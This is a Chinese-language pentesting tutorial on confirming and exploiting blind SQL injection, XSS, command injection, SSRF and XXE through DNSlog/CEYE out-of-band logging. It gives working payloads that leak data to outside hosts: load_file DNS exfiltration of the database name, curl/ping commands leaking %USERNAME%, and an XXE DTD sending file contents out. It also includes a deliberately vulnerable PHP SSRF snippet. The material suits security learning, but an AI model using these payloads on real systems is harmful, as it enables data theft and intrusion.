@[TOC]
##  前言
前几天看到关于这个的总结，我也自己总结一下，主要多一种思路。
在渗透测试过程中，开发不可能每一次都将结果输出到页面上，也就是漏洞无回显的情况，那么在这种情况下，我们可以通过dnslog判断漏洞存在，或者通过起一个python的http服务来判断，方法很多，下面主要进行一些情况的分析。

平台：
[DNSlog](http://www.dnslog.cn/)
[CEYE](http://ceye.io/)
##  SQL注入没有回显
在sql注入中，有回显的意思是会显示出我们想要得到的内容。对于有回显的，我们有Union注入，报错注入的类型。没有回显的，有布尔盲注和时间盲注的类型。当然sql注入类型，还有堆叠注入，两次注入，宽字节注入这种类型。
###  布尔盲注
实验地址：BUU的sql-labs

![在这里插入图片描述](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/50e440daba2040779b97bf51febbf0fb.png)
![在这里插入图片描述](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/39bf717143364ad7964d3ce8f7f89552.png)
当语句正确，有回显，语句错误，没有回显。
这个时候就是典型的布尔盲注。
语句为`id=1' and length(database())>7--+`，有回显
![在这里插入图片描述](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/55923fd0edf04f2980902fc6e2bfcc54.png)
语句为`id=1' and length(database())>8--+`，没有回显
![在这里插入图片描述](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/4aad084df5394271a775f24fb58e0ca1.png)
这样我们就可以得出数据库长度为8，后面操作类似
我们用脚本爆
###  时间盲注
延时盲注，一种盲注的手法。在渗透测试过程中当我们不能使用显错注入、报错注入以及布尔盲注无论布尔值为真还是为假，页面都返回一样之后，我们可以尝试使用延时盲注，通过加载页面的时间长度来判断数据是否成功。在PHP中有一个if()函数，语法为if(exp1,exp2,exp3)，当exp1返回为真时，执行exp2，返回为假时，执行exp3。配合延时函数sleep()来获取相应数据的ascii码，最后还原成数据。下面我将通过实例来介绍如今进行延时盲注。
1.我们发现，后面的布尔值不论是真还是假，页面返回的都是一样的
![在这里插入图片描述](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/68452c0bbed840138a84077d784e1082.png)
2.典型的时间盲注
![在这里插入图片描述](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/f17311c754ce4651aae08c70c1dc85c8.png)
![在这里插入图片描述](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/ff3b6f59731746e381c9410636750575.png)
符合时间盲注。后面的操作也类似
我们还是使用脚本爆出。
###  dnslog打sql注入(重要)
**Dnslog**

dnslog，即dns日志，会解析访问dns服务的记录并显示出来，常被用来测试漏洞是否存在以及无法获取数据的时候进行外带数据。简单来说，dnslog就是一个服务器，会记录所有访问它的记录，包括访问的域名、访问的IP以及时间。那么我们就可以通过子查询，拼接dnslog的域名，最后通过dns日志得到需要的数据。

**Load_file()函数**
数据库中的load_file()函数，可以加载服务器中的内容。load_file('c:/1.txt')，读取文件并返回内容为字符串，使用load_file()函数获取数据需要有以下几个条件：
1.文件在服务器上
2.指定完整路径的文件
3.必须有FILE权限

利用DNSlog可以直接显示出sql注入的数据，从而进行数据的外带。
```php
?id=1 ' union select 1,2,load_file(concat('//',(select database()),'.vln43t.dnslog.cn
/abc')) %23
```
然后到DNSlog.cn平台上刷新记录，就可以看到数据库显示出来。
也可以利用CEYE平台
##  DNS盲打xss
作用：主要是用来判断XSS漏洞的存在
通过盲打，让触发者浏览器访问预设至的链接地址，如果盲打成功，会在平台上收到如下的链接访问记录：
payload：
```php
<img src=http://xss.t7y3wc.dnslog.cn>
```
![在这里插入图片描述](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/7a5d1f6fb0ad467f982b20210d42232a.png)
##  命令执行（重要）
针对不回显的命令注入漏洞，我们很难确定漏洞的存在并进一步利用，针对这种情况，我们可以利用DNSLOG来获取命令的执行结果

判断是否有命令执行漏洞
payload
```php
curl http://haha.xxx.ceye.io/aaa
ping hhh.xxxx.ceye.io
```
利用命令执行漏洞
```
http://127.0.0.1/test_blind/exec.php?cmd=ping+%USERNAME%.io5a5i.dnslog.cn
```
其中%USERNAME%表示windows用户名
```
附上windows常用变量
%APPDATA% :  列出应用程序数据的默认存放位置。
%CD% :  列出当前目录。
%CLIENTNAME% :  列出联接到终端服务会话时客户端的NETBIOS名。
%CMDCMDLINE% :  列出启动当前cmd.exe所使用的命令行。
%CMDEXTVERSION% :  命令出当前命令处理程序扩展版本号。
%CommonProgramFiles% :  列出了常用文件的文件夹路径。
%COMPUTERNAME% :  列出了计算机名。 
%COMSPEC% :  列出了可执行命令外壳（命令处理程序）的路径。
%DATE% :  列出当前日期。
%ERRORLEVEL% :  列出了最近使用的命令的错误代码。
%HOMEDRIVE% :  列出与用户主目录所在的驱动器盘符。
%HOMEPATH% :  列出用户主目录的完整路径。
%HOMESHARE% :  列出用户共享主目录的网络路径。
%LOGONSEVER% :  列出有效的当前登录会话的域名控制器名。
%NUMBER_OF_PROCESSORS% :  列出了计算机安装的处理器数。
%OS% :  列出操作系统的名字。(Windows XP 和 Windows 2000 列为 Windows_NT.)
%Path% :  列出了可执行文件的搜索路径。
%PATHEXT% :  列出操作系统认为可被执行的文件扩展名。 
%PROCESSOR_ARCHITECTURE% :  列出了处理器的芯片架构。
%PROCESSOR_IDENTFIER% :  列出了处理器的描述。
%PROCESSOR_LEVEL% :  列出了计算机的处理器的型号。 
%PROCESSOR_REVISION% :  列出了处理器的修订号。
%ProgramFiles% :  列出了Program Files文件夹的路径。
%PROMPT% :  列出了当前命令解释器的命令提示设置。
%RANDOM% :  列出界于0 和 32767之间的随机十进制数。
%SESSIONNAME% :  列出连接到终端服务会话时的连接和会话名。
%SYSTEMDRIVE% :  列出了Windows启动目录所在驱动器。
%SYSTEMROOT% :  列出了Windows启动目录的位置。
%TEMP% and %TMP% :  列出了当前登录的用户可用应用程序的默认临时目录。
%TIME% :  列出当前时间。
%USERDOMAIN% :  列出了包含用户帐号的域的名字。
%USERNAME% :  列出当前登录的用户的名字。
%USERPROFILE% :  列出当前用户Profile文件位置。
%WINDIR% :  列出操作系统目录的位置。  
%ALLUSERSPROFILE% 本地 返回“所有用户”配置文件的位置。 
%APPDATA% 本地 返回默认情况下应用程序存储数据的位置。 
%CD% 本地 返回当前目录字符串。 
%CMDCMDLINE% 本地 返回用来启动当前的 Cmd.exe 的准确命令行。 
%CMDEXTVERSION% 系统 返回当前的“命令处理程序扩展”的版本号。 
%COMPUTERNAME%  系统 返回计算机的名称。 
%COMSPEC%  系统 返回命令行解释器可执行程序的准确路径。 
%DATE%  系统 返回当前日期。使用与 date /t 命令相同的格式。由 Cmd.exe 生成。有关 date 命令的详细信息，请参阅 Date。 
%ERRORLEVEL%  系统 返回上一条命令的错误代码。通常用非零值表示错误。 
%HOMEDRIVE%  系统 返回连接到用户主目录的本地工作站驱动器号。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。 
%HOMEPATH%  系统 返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。 
%HOMESHARE%  系统 返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。 
%LOGONSERVER%  本地 返回验证当前登录会话的域控制器的名称。 
%NUMBER_OF_PROCESSORS%  系统 指定安装在计算机上的处理器的数目。 
%OS%  系统 返回操作系统名称。Windows 2000 显示其操作系统为 Windows_NT。 
%PATH% 系统 指定可执行文件的搜索路径。 
%PATHEXT% 系统 返回操作系统认为可执行的文件扩展名的列表。 
%PROCESSOR_ARCHITECTURE%  系统 返回处理器的芯片体系结构。值：x86 或 IA64（基于 Itanium）。 
%PROCESSOR_IDENTFIER% 系统 返回处理器说明。 
%PROCESSOR_LEVEL%  系统 返回计算机上安装的处理器的型号。 
%PROCESSOR_REVISION% 系统 返回处理器的版本号。 
%PROMPT% 本地 返回当前解释程序的命令提示符设置。由 Cmd.exe 生成。 
%RANDOM% 系统 返回 0 到 32767 之间的任意十进制数字。由 Cmd.exe 生成。 
%SYSTEMDRIVE% 系统 返回包含 Windows server operating system 根目录（即系统根目录）的驱动器。 
%SYSTEMROOT%  系统 返回 Windows server operating system 根目录的位置。 
%TEMP% 和 %TMP% 系统和用户 返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要 TEMP，而其他应用程序则需要 TMP。 
%TIME% 系统 返回当前时间。使用与 time /t 命令相同的格式。由 Cmd.exe 生成。有关 time 命令的详细信息，请参阅 Time。 
%USERDOMAIN% 本地 返回包含用户帐户的域的名称。 
%USERNAME% 本地 返回当前登录的用户的名称。 
%USERPROFILE% 本地 返回当前用户的配置文件的位置。 
%WINDIR% 系统 返回操作系统目录的位置。
%allusersprofile%--------------------所有用户的profile路径
%Userprofile%-----------------------当前用户的配置文件目录
%Appdata%--------------------------当前用户的应用程序路径
%commonprogramfiles%-------------应用程序公用的文件路径
%homedrive%------------------------当前用户的主盘
%Homepath%------------------------当前用户的主目录
%programfiles%----------------------应用程序的默认安装目录
%systemdrive%----------------------系统所在的盘符
%systemroot%-----------------------系统所在的目录
%windir%----------------------------同上，总是跟systemroot一样
%tmp%------------------------------当前用户的临时目录
%temp%-----------------------------同上临时目录
```


##  SSRF（重要）
SSRF即服务端请求伪造，一种由攻击者构造的通过服务器发起请求的攻击。
测试代码
```php
<?php 
    echo file_get_contents($_GET['url']);
?>
```
直接url访问
payload
```php
url=http://ssrf.xxx.ceye.io
```
![在这里插入图片描述](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/5667c9f009c84d7aba96574726a81a1e.png)
然后看我们的dnslog平台是否有服务器的IP来判断
##  XXE
当我们遇到XXE，如果这个XXE漏洞可以解析外部实体，那么不用说，就可以拿来读取本地服务器文件，这时，我们只需把dtd文件改成这样
```xml
<!ENTITY % all
"<!ENTITY % send SYSTEM 'http://xxxx.ceye.io/%file;'>"
>
%all;
```
在我们的ceye平台就可以接收到这个读取的服务器文件了。

 ##   参考文章
 ```
 https://xz.aliyun.com/t/9916#toc-8
 https://www.freebuf.com/articles/web/201013.html
 ```